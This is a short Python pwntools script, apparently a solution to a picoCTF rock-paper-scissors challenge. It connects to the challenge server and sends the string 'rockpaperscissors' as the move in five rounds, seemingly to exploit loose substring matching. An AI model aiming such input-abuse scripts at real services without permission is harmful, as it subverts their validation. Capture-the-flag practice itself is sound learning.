#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

"""
chall = "./chall"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()
"""

p = remote("saturn.picoctf.net", 51420)
for i in range(5):
    p.sendlineafter("Type '1' to play a game", '1')
    p.sendlineafter(':', "rockpaperscissors")

p.interactive()
